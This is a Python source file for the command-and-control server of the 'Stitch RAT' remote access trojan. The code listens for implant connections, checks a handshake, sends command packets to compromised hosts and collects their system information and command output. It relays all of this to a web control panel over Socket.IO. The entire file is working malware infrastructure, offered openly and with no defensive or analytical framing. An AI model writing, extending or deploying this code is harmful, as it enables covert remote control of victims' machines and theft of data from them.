#!/usr/bin/env python3
"""
C2 Server Component for Stitch RAT
Handles actual payload connections on port 4433
Integrates with web interface via Socket.IO
"""

import socket
import threading
import struct
import time
import json
import logging
import os
from typing import Dict, Optional, Tuple
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s [C2] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

class C2Server:
    """Command & Control server for handling payload connections"""
    
    def __init__(self, host: str = '0.0.0.0', port: int = 4433, socketio_client=None):
        self.host = host
        self.port = port
        self.socketio = socketio_client
        self.running = False
        self.server_socket = None
        self.clients: Dict[str, dict] = {}
        self.client_threads: Dict[str, threading.Thread] = {}
        
    def start(self):
        """Start the C2 server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(10)
            self.server_socket.settimeout(1.0)
            self.running = True
            
            logger.info(f"C2 Server listening on {self.host}:{self.port}")
            
            # Start accept thread
            accept_thread = threading.Thread(target=self._accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start C2 server: {e}")
            return False
            
    def stop(self):
        """Stop the C2 server"""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        # Close all client connections
        for client_id in list(self.clients.keys()):
            self._remove_client(client_id)
            
        logger.info("C2 Server stopped")
        
    def _accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                client_socket.settimeout(30.0)  # 30 second timeout
                
                # Generate unique client ID
                client_id = f"{address[0]}:{address[1]}_{int(time.time())}"
                
                logger.info(f"New connection from {address}")
                
                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, address, client_id)
                )
                client_thread.daemon = True
                client_thread.start()
                
                self.client_threads[client_id] = client_thread
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    logger.error(f"Accept error: {e}")
                    
    def _handle_client(self, client_socket: socket.socket, address: Tuple, client_id: str):
        """Handle individual client connection"""
        try:
            # Expect initial handshake
            handshake = client_socket.recv(5)
            if handshake != b'HELLO':
                logger.warning(f"Invalid handshake from {address}: {handshake}")
                client_socket.close()
                return
                
            # Send acknowledgement
            client_socket.send(b'OK' + b'\x00' * 14)  # Padded response
            logger.info(f"Handshake complete with {client_id}")
            
            # Store client info
            self.clients[client_id] = {
                'socket': client_socket,
                'address': address,
                'connected_at': datetime.now(),
                'last_seen': datetime.now(),
                'system_info': None,
                'status': 'connected'
            }
            
            # Notify web interface of new connection
            self._notify_new_connection(client_id)
            
            # Main communication loop
            while self.running and client_id in self.clients:
                try:
                    # Wait for data with timeout
                    data = client_socket.recv(4096)
                    if not data:
                        logger.info(f"Client {client_id} disconnected")
                        break
                        
                    # Update last seen
                    self.clients[client_id]['last_seen'] = datetime.now()
                    
                    # Process received data
                    self._process_client_data(client_id, data)
                    
                except socket.timeout:
                    # Send heartbeat/ping
                    try:
                        client_socket.send(self._create_ping_packet())
                    except:
                        logger.info(f"Client {client_id} unresponsive")
                        break
                        
                except Exception as e:
                    logger.error(f"Error handling client {client_id}: {e}")
                    break
                    
        except Exception as e:
            logger.error(f"Client handler error for {client_id}: {e}")
            
        finally:
            self._remove_client(client_id)
            
    def _remove_client(self, client_id: str):
        """Remove client and clean up"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            
            del self.clients[client_id]
            
            # Notify web interface
            self._notify_disconnection(client_id)
            
        if client_id in self.client_threads:
            del self.client_threads[client_id]
            
    def _process_client_data(self, client_id: str, data: bytes):
        """Process data received from client"""
        try:
            # Parse packet structure (assuming: magic[4] + cmd[2] + len[2] + data[...])
            if len(data) < 8:
                return
                
            magic = struct.unpack('I', data[:4])[0]
            cmd_id = struct.unpack('H', data[4:6])[0]
            data_len = struct.unpack('H', data[6:8])[0]
            payload = data[8:8+data_len] if data_len > 0 else b''
            
            logger.debug(f"Received command {cmd_id} from {client_id}")
            
            # Handle different command types
            if cmd_id == 0x01:  # PING response
                logger.debug(f"Ping response from {client_id}")
                
            elif cmd_id == 0x02:  # System info
                try:
                    info = json.loads(payload.decode('utf-8'))
                    self.clients[client_id]['system_info'] = info
                    self._notify_system_info(client_id, info)
                except:
                    pass
                    
            elif cmd_id == 0x03:  # Command output
                try:
                    output = payload.decode('utf-8')
                    self._notify_command_output(client_id, output)
                except:
                    pass
                    
            # Forward to web interface for further processing
            if self.socketio:
                self.socketio.emit('c2_data', {
                    'client_id': client_id,
                    'cmd_id': cmd_id,
                    'data': payload.hex()
                })
                
        except Exception as e:
            logger.error(f"Error processing client data: {e}")
            
    def send_command(self, client_id: str, cmd_id: int, data: bytes = b'') -> bool:
        """Send command to specific client"""
        if client_id not in self.clients:
            return False
            
        try:
            packet = self._create_command_packet(cmd_id, data)
            self.clients[client_id]['socket'].send(packet)
            logger.info(f"Sent command {cmd_id} to {client_id}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send command to {client_id}: {e}")
            self._remove_client(client_id)
            return False
            
    def get_clients(self) -> Dict:
        """Get list of connected clients"""
        client_list = {}
        for client_id, info in self.clients.items():
            client_list[client_id] = {
                'address': info['address'],
                'connected_at': info['connected_at'].isoformat(),
                'last_seen': info['last_seen'].isoformat(),
                'status': info['status'],
                'system_info': info['system_info']
            }
        return client_list
        
    def _create_command_packet(self, cmd_id: int, data: bytes) -> bytes:
        """Create command packet"""
        magic = 0xDEADBEEF  # Magic number
        data_len = len(data)
        packet = struct.pack('IHH', magic, cmd_id, data_len) + data
        return packet
        
    def _create_ping_packet(self) -> bytes:
        """Create ping packet"""
        return self._create_command_packet(0x01, b'')
        
    def _notify_new_connection(self, client_id: str):
        """Notify web interface of new connection"""
        if self.socketio:
            self.socketio.emit('client_connected', {
                'client_id': client_id,
                'address': self.clients[client_id]['address'],
                'timestamp': datetime.now().isoformat()
            })
            
    def _notify_disconnection(self, client_id: str):
        """Notify web interface of disconnection"""
        if self.socketio:
            self.socketio.emit('client_disconnected', {
                'client_id': client_id,
                'timestamp': datetime.now().isoformat()
            })
            
    def _notify_system_info(self, client_id: str, info: dict):
        """Notify web interface of system info"""
        if self.socketio:
            self.socketio.emit('system_info', {
                'client_id': client_id,
                'info': info
            })
            
    def _notify_command_output(self, client_id: str, output: str):
        """Notify web interface of command output"""
        if self.socketio:
            self.socketio.emit('command_output', {
                'client_id': client_id,
                'output': output
            })


def standalone_server():
    """Run C2 server in standalone mode for testing"""
    server = C2Server()
    
    try:
        if server.start():
            logger.info("C2 Server running. Press Ctrl+C to stop.")
            while True:
                time.sleep(1)
                # Print status every 10 seconds
                if int(time.time()) % 10 == 0:
                    clients = server.get_clients()
                    logger.info(f"Connected clients: {len(clients)}")
                    
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        
    finally:
        server.stop()


if __name__ == "__main__":
    standalone_server()